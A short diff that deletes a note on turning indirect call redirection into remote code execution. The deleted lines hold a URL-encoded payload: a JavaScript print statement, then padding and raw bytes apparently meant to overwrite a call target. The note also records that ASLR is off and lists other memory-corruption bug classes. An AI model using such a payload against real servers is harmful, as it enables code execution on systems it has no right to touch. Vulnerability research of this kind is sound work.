@@ -1,7 +1,0 @@
-Indirect Call Redirection -> RCE
-
-console.log(%27>>>Server%20side%20code%20execution!!%27);//0123456789012345679%03%00%00%00
-
-note: no ASLR!
-Other possibilities:
-Format String Vulns, UAF, Out of Bounds Array Access, Integer Overflow
